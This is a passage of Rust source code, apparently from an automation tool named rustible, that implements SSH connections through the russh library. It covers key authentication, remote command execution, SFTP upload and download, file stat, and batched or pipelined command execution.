authentication attempt failed\");\n                }\n            }\n        }\n\n        Err(ConnectionError::AuthenticationFailed(\n            \"All SSH agent identities rejected\".to_string(),\n        ))\n    }\n\n    /// Try key-based authentication\n    ///\n    /// Supports Ed25519 and RSA keys, with or without passphrases.\n    /// The key is loaded using russh_keys::load_secret_key which automatically\n    /// detects the key type (Ed25519, RSA, etc.) based on the file format.\n    async fn try_key_auth(\n        session: \u0026mut Handle\u003cClientHandler\u003e,\n        user: \u0026str,\n        key_path: \u0026Path,\n        passphrase: Option\u003c\u0026str\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        if !key_path.exists() {\n            return Err(ConnectionError::AuthenticationFailed(format!(\n                \"Key file not found: {}\",\n                key_path.display()\n            )));\n        }\n\n        // Load the private key\n        let key_pair = if let Some(pass) = passphrase {\n            // Load with passphrase\n            load_secret_key(key_path, Some(pass)).map_err(|e| {\n                ConnectionError::AuthenticationFailed(format!(\n                    \"Failed to load key {} with passphrase: {}\",\n                    key_path.display(),\n                    e\n                ))\n            })?\n        } else {\n            // Try loading without passphrase first\n            load_secret_key(key_path, None).map_err(|e| {\n                ConnectionError::AuthenticationFailed(format!(\n                    \"Failed to load key {}: {}\",\n                    key_path.display(),\n                    e\n                ))\n            })?\n        };\n\n        // Authenticate with the key\n        let authenticated = session\n            .authenticate_publickey(user, Arc::new(key_pair))\n            .await\n            .map_err(|e| {\n                ConnectionError::AuthenticationFailed(format!(\n                    \"Key authentication failed for {}: {}\",\n                    key_path.display(),\n                    e\n                ))\n            })?;\n\n        if authenticated {\n            Ok(())\n        } else {\n            Err(ConnectionError::AuthenticationFailed(\n                \"Key authentication failed\".to_string(),\n            ))\n        }\n    }\n}\n\n#[async_trait]\nimpl Connection for RusshConnection {\n    fn identifier(\u0026self) -\u003e \u0026str {\n        \u0026self.identifier\n    }\n\n    async fn is_alive(\u0026self) -\u003e bool {\n        // Check if we're marked as connected (lock-free check)\n        if !self.connected.load(Ordering::SeqCst) {\n            return false;\n        }\n\n        // Check if we have a handle using read lock (allows concurrent checks)\n        let has_handle = self.handle.read().await.is_some();\n        if !has_handle {\n            return false;\n        }\n\n        // We consider the connection alive if it's marked as connected and has a handle\n        // A full health check would require opening a channel, but that's expensive\n        // The connection will be marked as dead when an operation fails\n        true\n    }\n\n    async fn execute(\n        \u0026self,\n        command: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e {\n        let options = options.unwrap_or_default();\n\n        // Build the full command with options\n        // Prepend environment variables to the command since russh doesn't have request_env\n        let full_command = Self::build_command_with_env(command, \u0026options);\n\n        trace!(command = %full_command, \"Executing remote command\");\n\n        // Execute the command with optional timeout\n        let execute_future = async {\n            // Get the handle using read lock - allows concurrent channel opens\n            // We only hold the lock briefly to open a channel\n            let handle_guard = self.handle.read().await;\n            let handle: \u0026Handle\u003cClientHandler\u003e = handle_guard\n                .as_ref()\n                .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n            // 1. Open a channel (while holding read lock)\n            let mut channel = handle.channel_open_session().await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to open channel: {}\", e))\n            })?;\n\n            // Drop the handle guard to release the read lock\n            drop(handle_guard);\n\n            // 2. Execute the command\n            channel.exec(true, full_command).await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to execute command: {}\", e))\n            })?;\n\n            // Handle escalation password if needed\n            if options.escalate \u0026\u0026 options.escalate_password.is_some() {\n                let password = options.escalate_password.as_ref().unwrap();\n                let password_data = format!(\"{}\\n\", password);\n                let mut cursor = tokio::io::BufReader::new(password_data.as_bytes());\n                channel.data(\u0026mut cursor).await.map_err(|e| {\n                    ConnectionError::ExecutionFailed(format!(\"Failed to write password: {}\", e))\n                })?;\n            }\n\n            // 3. Capture stdout/stderr\n            let mut stdout = Vec::new();\n            let mut stderr = Vec::new();\n            let mut exit_code = None;\n\n            // Read all messages from the channel\n            while let Some(msg) = channel.wait().await {\n                match msg {\n                    ChannelMsg::Data { ref data } =\u003e {\n                        stdout.extend_from_slice(data);\n                    }\n                    ChannelMsg::ExtendedData { ref data, ext } =\u003e {\n                        // Extended data type 1 is stderr\n                        if ext == 1 {\n                            stderr.extend_from_slice(data);\n                        }\n                    }\n                    ChannelMsg::ExitStatus { exit_status } =\u003e {\n                        exit_code = Some(exit_status);\n                    }\n                    ChannelMsg::Eof =\u003e {\n                        // End of file, continue reading until channel closes\n                    }\n                    ChannelMsg::Close =\u003e {\n                        // Channel closed, we're done\n                        break;\n                    }\n                    _ =\u003e {\n                        // Ignore other message types\n                    }\n                }\n            }\n\n            // Wait for channel to close\n            let _ = channel.eof().await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to send EOF: {}\", e))\n            });\n\n            // 4. Return CommandResult\n            // Exit status from SSH is u32, but we need i32 for CommandResult\n            // Use i32::MAX for unknown exit code (None case) as it indicates an error\n            let exit_code: i32 = exit_code.map(|e| e as i32).unwrap_or(i32::MAX);\n            let stdout_str = String::from_utf8_lossy(\u0026stdout).to_string();\n            let stderr_str = String::from_utf8_lossy(\u0026stderr).to_string();\n\n            trace!(exit_code = %exit_code, \"Command completed\");\n\n            if exit_code == 0 {\n                Ok(CommandResult::success(stdout_str, stderr_str))\n            } else {\n                Ok(CommandResult::failure(exit_code, stdout_str, stderr_str))\n            }\n        };\n\n        // Apply timeout if specified\n        if let Some(timeout_secs) = options.timeout {\n            match tokio::time::timeout(Duration::from_secs(timeout_secs), execute_future).await {\n                Ok(result) =\u003e result,\n                Err(_) =\u003e Err(ConnectionError::Timeout(timeout_secs)),\n            }\n        } else {\n            execute_future.await\n        }\n    }\n\n    async fn upload(\n        \u0026self,\n        local_path: \u0026Path,\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n\n        debug!(\n            local = %local_path.display(),\n            remote = %remote_path.display(),\n            \"Uploading file via SFTP\"\n        );\n\n        // Get handle using read lock - allows concurrent uploads\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        // Create parent directories if needed\n        if options.create_dirs {\n            if let Some(parent) = remote_path.parent() {\n                Self::create_remote_dirs_sftp(\u0026sftp, parent).await?;\n            }\n        }\n\n        // Read local file\n        let content = tokio::fs::read(local_path).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to read local file {}: {}\",\n                local_path.display(),\n                e\n            ))\n        })?;\n\n        // Create/open remote file for writing\n        let remote_path_str = remote_path.to_string_lossy().to_string();\n        let mut remote_file = sftp.create(\u0026remote_path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to create remote file {}: {}\",\n                remote_path.display(),\n                e\n            ))\n        })?;\n\n        // Write content to remote file\n        remote_file.write_all(\u0026content).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to write to remote file: {}\", e))\n        })?;\n\n        // Close the file\n        drop(remote_file);\n\n        // Set permissions using setstat\n        if let Some(mode) = options.mode {\n            let mut attrs = russh_sftp::protocol::FileAttributes::default();\n            attrs.permissions = Some(mode);\n            sftp.set_metadata(\u0026remote_path_str, attrs)\n                .await\n                .map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\n                        \"Failed to set file permissions: {}\",\n                        e\n                    ))\n                })?;\n        }\n\n        // Drop the SFTP session before using execute()\n        drop(sftp);\n\n        // Set owner/group if specified using chown command\n        if options.owner.is_some() || options.group.is_some() {\n            let escaped_path = escape_shell_arg(\u0026remote_path.to_string_lossy());\n            let owner_group = match (\u0026options.owner, \u0026options.group) {\n                (Some(owner), Some(group)) =\u003e format!(\"{}:{}\", owner, group),\n                (Some(owner), None) =\u003e owner.clone(),\n                (None, Some(group)) =\u003e format!(\":{}\", group),\n                (None, None) =\u003e unreachable!(),\n            };\n            let chown_cmd = format!(\"chown {} {}\", owner_group, escaped_path);\n            let result = self.execute(\u0026chown_cmd, None).await?;\n            if !result.success {\n                warn!(\n                    \"Failed to set owner/group on {}: {}\",\n                    remote_path.display(),\n                    result.stderr\n                );\n            }\n        }\n\n        Ok(())\n    }\n\n    async fn upload_content(\n        \u0026self,\n        content: \u0026[u8],\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n\n        debug!(\n            remote = %remote_path.display(),\n            size = %content.len(),\n            \"Uploading content via SFTP\"\n        );\n\n        // Get handle using read lock - allows concurrent uploads\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        // Create parent directories if needed\n        if options.create_dirs {\n            if let Some(parent) = remote_path.parent() {\n                Self::create_remote_dirs_sftp(\u0026sftp, parent).await?;\n            }\n        }\n\n        // Create/open remote file for writing\n        let remote_path_str = remote_path.to_string_lossy().to_string();\n        let mut remote_file = sftp.create(\u0026remote_path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to create remote file {}: {}\",\n                remote_path.display(),\n                e\n            ))\n        })?;\n\n        // Write content to remote file\n        remote_file.write_all(content).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to write to remote file: {}\", e))\n        })?;\n\n        // Close the file\n        drop(remote_file);\n\n        // Set permissions using setstat\n        if let Some(mode) = options.mode {\n            let mut attrs = russh_sftp::protocol::FileAttributes::default();\n            attrs.permissions = Some(mode);\n            sftp.set_metadata(\u0026remote_path_str, attrs)\n                .await\n                .map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\n                        \"Failed to set file permissions: {}\",\n                        e\n                    ))\n                })?;\n        }\n\n        // Drop the SFTP session before using execute()\n        drop(sftp);\n\n        // Set owner/group if specified using chown command\n        if options.owner.is_some() || options.group.is_some() {\n            let escaped_path = escape_shell_arg(\u0026remote_path.to_string_lossy());\n            let owner_group = match (\u0026options.owner, \u0026options.group) {\n                (Some(owner), Some(group)) =\u003e format!(\"{}:{}\", owner, group),\n                (Some(owner), None) =\u003e owner.clone(),\n                (None, Some(group)) =\u003e format!(\":{}\", group),\n                (None, None) =\u003e unreachable!(),\n            };\n            let chown_cmd = format!(\"chown {} {}\", owner_group, escaped_path);\n            let result = self.execute(\u0026chown_cmd, None).await?;\n            if !result.success {\n                warn!(\n                    \"Failed to set owner/group on {}: {}\",\n                    remote_path.display(),\n                    result.stderr\n                );\n            }\n        }\n\n        Ok(())\n    }\n\n    async fn download(\u0026self, remote_path: \u0026Path, local_path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e {\n        debug!(\n            remote = %remote_path.display(),\n            local = %local_path.display(),\n            \"Downloading file via russh SFTP\"\n        );\n\n        // Get handle using read lock - allows concurrent downloads\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        // Open remote file for reading\n        let remote_path_str = remote_path.to_string_lossy().to_string();\n        let mut remote_file = sftp.open(\u0026remote_path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to open remote file {}: {}\",\n                remote_path.display(),\n                e\n            ))\n        })?;\n\n        // Read content from remote file\n        let mut content = Vec::new();\n        remote_file.read_to_end(\u0026mut content).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to read remote file: {}\", e))\n        })?;\n\n        // Create parent directories for local file\n        if let Some(parent) = local_path.parent() {\n            tokio::fs::create_dir_all(parent).await.map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to create local directory {}: {}\",\n                    parent.display(),\n                    e\n                ))\n            })?;\n        }\n\n        // Write local file\n        tokio::fs::write(local_path, \u0026content).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to write local file {}: {}\",\n                local_path.display(),\n                e\n            ))\n        })?;\n\n        debug!(\"Download completed successfully\");\n        Ok(())\n    }\n\n    async fn download_content(\u0026self, remote_path: \u0026Path) -\u003e ConnectionResult\u003cVec\u003cu8\u003e\u003e {\n        debug!(remote = %remote_path.display(), \"Downloading content via russh SFTP\");\n\n        // Get handle using read lock - allows concurrent downloads\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        // Open remote file for reading\n        let remote_path_str = remote_path.to_string_lossy().to_string();\n        let mut remote_file = sftp.open(\u0026remote_path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\n                \"Failed to open remote file {}: {}\",\n                remote_path.display(),\n                e\n            ))\n        })?;\n\n        // Read content from remote file\n        let mut content = Vec::new();\n        remote_file.read_to_end(\u0026mut content).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to read remote file: {}\", e))\n        })?;\n\n        debug!(size = %content.len(), \"Content download completed successfully\");\n        Ok(content)\n    }\n\n    async fn path_exists(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        trace!(path = %path.display(), \"Checking if path exists via SFTP\");\n\n        // Get handle using read lock - allows concurrent checks\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        // Use try_exists to check if path exists\n        let path_str = path.to_string_lossy().to_string();\n        match sftp.try_exists(\u0026path_str).await {\n            Ok(exists) =\u003e Ok(exists),\n            Err(e) =\u003e {\n                // Log the error but treat certain errors as \"does not exist\"\n                debug!(path = %path.display(), error = %e, \"Error checking path existence\");\n                Ok(false)\n            }\n        }\n    }\n\n    async fn is_directory(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        trace!(path = %path.display(), \"Checking if path is directory via SFTP\");\n\n        // Get handle using read lock - allows concurrent checks\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        // Get metadata and check if it's a directory\n        let path_str = path.to_string_lossy().to_string();\n        match sftp.metadata(\u0026path_str).await {\n            Ok(attrs) =\u003e Ok(attrs.is_dir()),\n            Err(_) =\u003e Ok(false),\n        }\n    }\n\n    async fn stat(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cFileStat\u003e {\n        trace!(path = %path.display(), \"Getting file stats via SFTP\");\n\n        // Get handle using read lock - allows concurrent stat calls\n        let handle_guard = self.handle.read().await;\n        let handle = handle_guard\n            .as_ref()\n            .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n        // Open SFTP session (while holding read lock)\n        let sftp = Self::open_sftp(handle).await?;\n\n        // Release the read lock immediately after opening SFTP session\n        drop(handle_guard);\n\n        let path_str = path.to_string_lossy().to_string();\n\n        // First get symlink metadata to determine if it's a symlink\n        let is_symlink = match sftp.symlink_metadata(\u0026path_str).await {\n            Ok(attrs) =\u003e attrs.is_symlink(),\n            Err(_) =\u003e false,\n        };\n\n        // Get regular metadata (follows symlinks)\n        let attrs = sftp.metadata(\u0026path_str).await.map_err(|e| {\n            // Check for common SFTP error conditions\n            let error_str = e.to_string().to_lowercase();\n            if error_str.contains(\"no such file\") || error_str.contains(\"not found\") {\n                ConnectionError::TransferFailed(format!(\"File not found: {}\", path.display()))\n            } else if error_str.contains(\"permission denied\") {\n                ConnectionError::TransferFailed(format!(\"Permission denied: {}\", path.display()))\n            } else {\n                ConnectionError::TransferFailed(format!(\"Failed to stat {}: {}\", path.display(), e))\n            }\n        })?;\n\n        // Extract file attributes from russh-sftp FileAttributes\n        let size = attrs.size.unwrap_or(0);\n        let mode = attrs.permissions.unwrap_or(0);\n        let uid = attrs.uid.unwrap_or(0);\n        let gid = attrs.gid.unwrap_or(0);\n        let atime = attrs.atime.map(|t| t as i64).unwrap_or(0);\n        let mtime = attrs.mtime.map(|t| t as i64).unwrap_or(0);\n\n        Ok(FileStat {\n            size,\n            mode,\n            uid,\n            gid,\n            atime,\n            mtime,\n            is_dir: attrs.is_dir(),\n            is_file: attrs.is_regular(),\n            is_symlink,\n        })\n    }\n\n    async fn close(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        debug!(\"Closing SSH connection\");\n\n        // Mark as disconnected first (lock-free)\n        self.connected.store(false, Ordering::SeqCst);\n\n        // Take the handle out using write lock - this is the only write operation\n        let handle = {\n            let mut handle_guard = self.handle.write().await;\n            handle_guard.take()\n        };\n\n        // Close the connection if we had one\n        if let Some(handle) = handle {\n            // Request disconnect from the SSH server\n            let _ = handle\n                .disconnect(\n                    russh::Disconnect::ByApplication,\n                    \"Connection closed by client\",\n                    \"en\",\n                )\n                .await;\n        }\n\n        Ok(())\n    }\n}\n\n/// Maximum number of concurrent SSH channels to use for batch execution.\n/// SSH spec allows many more, but we stay conservative to avoid overwhelming servers.\nconst MAX_CONCURRENT_CHANNELS: usize = 10;\n\nimpl RusshConnection {\n    /// Execute multiple commands in parallel using channel multiplexing.\n    ///\n    /// This method opens multiple SSH channels on the same connection and executes\n    /// commands concurrently. Results are returned in the same order as the input commands.\n    ///\n    /// # Arguments\n    ///\n    /// * `commands` - A slice of command strings to execute\n    /// * `options` - Optional execution options applied to all commands\n    ///\n    /// # Returns\n    ///\n    /// A vector of results in the same order as the input commands. Each command\n    /// either succeeds with a `CommandResult` or fails with a `ConnectionError`.\n    /// If one command fails, others continue executing.\n    ///\n    /// # Limits\n    ///\n    /// * Maximum 10 concurrent channels to avoid overwhelming SSH servers\n    /// * Per-command timeout (from options), not total timeout\n    ///\n    /// # Example\n    ///\n    /// ```ignore\n    /// let commands = vec![\n    ///     \"hostname\".to_string(),\n    ///     \"uptime\".to_string(),\n    ///     \"date\".to_string(),\n    /// ];\n    /// let results = conn.execute_batch(\u0026commands, None).await;\n    /// for (cmd, result) in commands.iter().zip(results.iter()) {\n    ///     match result {\n    ///         Ok(r) =\u003e println!(\"{}: {}\", cmd, r.stdout),\n    ///         Err(e) =\u003e eprintln!(\"{}: error: {}\", cmd, e),\n    ///     }\n    /// }\n    /// ```\n    pub async fn execute_batch(\n        \u0026self,\n        commands: \u0026[String],\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e Vec\u003cConnectionResult\u003cCommandResult\u003e\u003e {\n        if commands.is_empty() {\n            return Vec::new();\n        }\n\n        // Quick check if connection is closed\n        if !self.connected.load(Ordering::SeqCst) {\n            return commands\n                .iter()\n                .map(|_| Err(ConnectionError::ConnectionClosed))\n                .collect();\n        }\n\n        let options = options.unwrap_or_default();\n        let timeout_duration = options.timeout.map(Duration::from_secs);\n\n        debug!(\n            command_count = %commands.len(),\n            \"Executing batch of commands with channel multiplexing\"\n        );\n\n        // Get a clone of the handle Arc for spawning tasks\n        let handle_arc = self.handle.clone();\n\n        // Prepare all command strings upfront\n        let prepared_commands: Vec\u003c(usize, String)\u003e = commands\n            .iter()\n            .enumerate()\n            .map(|(idx, cmd)| (idx, Self::build_command_with_env(cmd, \u0026options)))\n            .collect();\n\n        // Use semaphore to limit concurrent channels\n        let semaphore = Arc::new(tokio::sync::Semaphore::new(MAX_CONCURRENT_CHANNELS));\n\n        // Spawn tasks for each command\n        let mut tasks: Vec\u003ctokio::task::JoinHandle\u003c(usize, ConnectionResult\u003cCommandResult\u003e)\u003e\u003e =\n            Vec::with_capacity(commands.len());\n\n        for (idx, full_command) in prepared_commands {\n            let sem = semaphore.clone();\n            let handle_arc = handle_arc.clone();\n            let escalate = options.escalate;\n            let escalate_password = options.escalate_password.clone();\n            let timeout_dur = timeout_duration;\n\n            let task = tokio::spawn(async move {\n                // Acquire semaphore permit (limits concurrent channels)\n                let _permit = match sem.acquire().await {\n                    Ok(p) =\u003e p,\n                    Err(_) =\u003e {\n                        return (\n                            idx,\n                            Err(ConnectionError::ExecutionFailed(\n                                \"Semaphore closed\".to_string(),\n                            )),\n                        );\n                    }\n                };\n\n                let result = Self::execute_single_channel(\n                    \u0026handle_arc,\n                    \u0026full_command,\n                    escalate,\n                    escalate_password,\n                    timeout_dur,\n                )\n                .await;\n\n                (idx, result)\n            });\n\n            tasks.push(task);\n        }\n\n        // Wait for all tasks to complete and collect results\n        let task_results = futures::future::join_all(tasks).await;\n\n        // Collect results in order\n        let mut results: Vec\u003cConnectionResult\u003cCommandResult\u003e\u003e = Vec::with_capacity(commands.len());\n\n        // Initialize with error placeholders\n        for idx in 0..commands.len() {\n            results.push(Err(ConnectionError::ExecutionFailed(format!(\n                \"Command {} failed to execute (task error)\",\n                idx\n            ))));\n        }\n\n        // Fill in actual results\n        for task_result in task_results {\n            match task_result {\n                Ok((idx, result)) =\u003e {\n                    results[idx] = result;\n                }\n                Err(join_error) =\u003e {\n                    // This happens if the task panicked - shouldn't normally occur\n                    warn!(error = %join_error, \"Task panicked during batch execution\");\n                }\n            }\n        }\n\n        results\n    }\n\n    /// Execute a single command on a new channel.\n    ///\n    /// This is a helper method used by `execute_batch` to run one command\n    /// on its own SSH channel. It opens a new channel, executes the command,\n    /// collects output, and returns the result.\n    async fn execute_single_channel(\n        handle_arc: \u0026Arc\u003cRwLock\u003cOption\u003cHandle\u003cClientHandler\u003e\u003e\u003e\u003e,\n        full_command: \u0026str,\n        escalate: bool,\n        escalate_password: Option\u003cString\u003e,\n        timeout_duration: Option\u003cDuration\u003e,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e {\n        let execute_future = async {\n            // Get the handle using read lock - allows concurrent channel opens\n            let handle_guard = handle_arc.read().await;\n            let handle = handle_guard\n                .as_ref()\n                .ok_or_else(|| ConnectionError::ConnectionClosed)?;\n\n            // Open a new channel\n            let mut channel = handle.channel_open_session().await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to open channel: {}\", e))\n            })?;\n\n            // Release the lock immediately after opening the channel\n            drop(handle_guard);\n\n            // Execute the command on this channel\n            channel.exec(true, full_command).await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to execute command: {}\", e))\n            })?;\n\n            // Handle escalation password if needed\n            if escalate \u0026\u0026 escalate_password.is_some() {\n                let password = escalate_password.as_ref().unwrap();\n                let password_data = format!(\"{}\\n\", password);\n                let mut cursor = tokio::io::BufReader::new(password_data.as_bytes());\n                channel.data(\u0026mut cursor).await.map_err(|e| {\n                    ConnectionError::ExecutionFailed(format!(\"Failed to write password: {}\", e))\n                })?;\n            }\n\n            // Collect stdout, stderr, and exit code\n            let mut stdout = Vec::new();\n            let mut stderr = Vec::new();\n            let mut exit_code = None;\n\n            while let Some(msg) = channel.wait().await {\n                match msg {\n                    ChannelMsg::Data { ref data } =\u003e {\n                        stdout.extend_from_slice(data);\n                    }\n                    ChannelMsg::ExtendedData { ref data, ext } =\u003e {\n                        if ext == 1 {\n                            stderr.extend_from_slice(data);\n                        }\n                    }\n                    ChannelMsg::ExitStatus { exit_status } =\u003e {\n                        exit_code = Some(exit_status);\n                    }\n                    ChannelMsg::Eof | ChannelMsg::Close =\u003e {\n                        if matches!(msg, ChannelMsg::Close) {\n                            break;\n                        }\n                    }\n                    _ =\u003e {}\n                }\n            }\n\n            // Send EOF to cleanly close our side\n            let _ = channel.eof().await;\n\n            // Build result\n            let exit_code = exit_code.map(|e| e as i32).unwrap_or(i32::MAX);\n            let stdout_str = String::from_utf8_lossy(\u0026stdout).to_string();\n            let stderr_str = String::from_utf8_lossy(\u0026stderr).to_string();\n\n            trace!(exit_code = %exit_code, \"Channel command completed\");\n\n            if exit_code == 0 {\n                Ok(CommandResult::success(stdout_str, stderr_str))\n            } else {\n                Ok(CommandResult::failure(exit_code, stdout_str, stderr_str))\n            }\n        };\n\n        // Apply per-command timeout\n        if let Some(timeout) = timeout_duration {\n            match tokio::time::timeout(timeout, execute_future).await {\n                Ok(result) =\u003e result,\n                Err(_) =\u003e Err(ConnectionError::Timeout(timeout.as_secs())),\n            }\n        } else {\n            execute_future.await\n        }\n    }\n}\n\nimpl std::fmt::Debug for RusshConnection {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        let connected = self.connected.load(Ordering::Relaxed);\n        f.debug_struct(\"RusshConnection\")\n            .field(\"identifier\", \u0026self.identifier)\n            .field(\"connected\", \u0026connected)\n            .finish()\n    }\n}\n\n/// Builder for Russh connections\npub struct RusshConnectionBuilder {\n    /// Target host\n    pub host: String,\n    /// SSH port (default: 22)\n    pub port: u16,\n    /// Username for authentication\n    pub user: String,\n    /// Password for authentication (optional)\n    pub password: Option\u003cString\u003e,\n    /// Path to private key file (optional)\n    pub private_key: Option\u003cString\u003e,\n    /// Connection timeout in seconds (optional)\n    pub timeout: Option\u003cu64\u003e,\n    /// Enable compression\n    pub compression: bool,\n}\n\nimpl RusshConnectionBuilder {\n    /// Create a new Russh connection builder\n    pub fn new(host: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            host: host.into(),\n            port: 22,\n            user: std::env::var(\"USER\").unwrap_or_else(|_| \"root\".to_string()),\n            password: None,\n            private_key: None,\n            timeout: Some(30),\n            compression: false,\n        }\n    }\n\n    /// Set the port\n    pub fn port(mut self, port: u16) -\u003e Self {\n        self.port = port;\n        self\n    }\n\n    /// Set the username\n    pub fn user(mut self, user: impl Into\u003cString\u003e) -\u003e Self {\n        self.user = user.into();\n        self\n    }\n\n    /// Set the password\n    pub fn password(mut self, password: impl Into\u003cString\u003e) -\u003e Self {\n        self.password = Some(password.into());\n        self\n    }\n\n    /// Set the private key path\n    pub fn private_key(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.private_key = Some(path.into());\n        self\n    }\n\n    /// Set the connection timeout\n    pub fn timeout(mut self, timeout: u64) -\u003e Self {\n        self.timeout = Some(timeout);\n        self\n    }\n\n    /// Enable compression\n    pub fn compression(mut self, enabled: bool) -\u003e Self {\n        self.compression = enabled;\n        self\n    }\n\n    /// Build and connect\n    pub async fn connect(self) -\u003e ConnectionResult\u003cRusshConnection\u003e {\n        let host_config = HostConfig {\n            hostname: Some(self.host.clone()),\n            port: Some(self.port),\n            user: Some(self.user.clone()),\n            password: self.password,\n            identity_file: self.private_key,\n            connect_timeout: self.timeout,\n            compression: self.compression,\n            ..Default::default()\n        };\n\n        let config = ConnectionConfig::default();\n        RusshConnection::connect(\n            \u0026self.host,\n            self.port,\n            \u0026self.user,\n            Some(host_config),\n            \u0026config,\n        )\n        .await\n    }\n}\n\n// ============================================================================\n// SSH Request Pipelining\n// ============================================================================\n\n/// A pending command in the pipeline\n#[derive(Debug, Clone)]\npub struct PendingCommand {\n    /// The command string to execute\n    command: String,\n    /// Options for command execution\n    options: ExecuteOptions,\n}\n\nimpl PendingCommand {\n    /// Create a new pending command\n    pub fn new(command: impl Into\u003cString\u003e, options: Option\u003cExecuteOptions\u003e) -\u003e Self {\n        Self {\n            command: command.into(),\n            options: options.unwrap_or_default(),\n        }\n    }\n\n    /// Get the command string\n    pub fn command(\u0026self) -\u003e \u0026str {\n        \u0026self.command\n    }\n\n    /// Get the execution options\n    pub fn options(\u0026self) -\u003e \u0026ExecuteOptions {\n        \u0026self.options\n    }\n}\n\n/// SSH request pipelining executor\n///\n/// This struct enables true SSH pipelining by opening multiple channels\n/// before previous commands finish, executing all commands, and then\n/// collecting all results. This significantly reduces latency when\n/// executing multiple commands on a remote host.\n///\n/// # How It Works\n///\n/// SSH allows multiple channels to be opened on a single connection.\n/// Traditional execution waits for each command to complete before\n/// starting the next. With pipelining:\n///\n/// 1. All SSH channels are opened in parallel (without waiting)\n/// 2. All commands are executed on their respective channels\n/// 3. All outputs are collected concurrently\n///\n/// This eliminates the round-trip latency between commands.\n///\n/// # Difference from `execute_batch`\n///\n/// While `execute_batch` executes commands in parallel using spawned tasks,\n/// `PipelinedExecutor` provides a builder pattern for queuing commands\n/// without any network activity until `flush()` is called. This allows\n/// for more efficient batching when commands are added incrementally.\n///\n/// # Example\n///\n/// ```ignore\n/// use rustible::connection::russh::{RusshConnection, PipelinedExecutor};\n///\n/// let conn = RusshConnection::connect(...).await?;\n/// let mut pipeline = conn.pipeline();\n///\n/// // Queue commands - these don't execute yet\n/// pipeline.queue(\"echo 'hello'\", None);\n/// pipeline.queue(\"echo 'world'\", None);\n/// pipeline.queue(\"date\", None);\n///\n/// // Flush executes all commands with pipelining\n/// let results = pipeline.flush().await;\n/// for result in results {\n///     println!(\"{:?}\", result);\n/// }\n/// ```\n///\n/// # Memory Usage\n///\n/// The pipeline stores commands in memory until flush() is called.\n/// For very large numbers of commands, consider batching into smaller\n/// pipelines to limit memory usage.\npub struct PipelinedExecutor\u003c'a\u003e {\n    /// Reference to the underlying SSH connection\n    connection: \u0026'a RusshConnection,\n  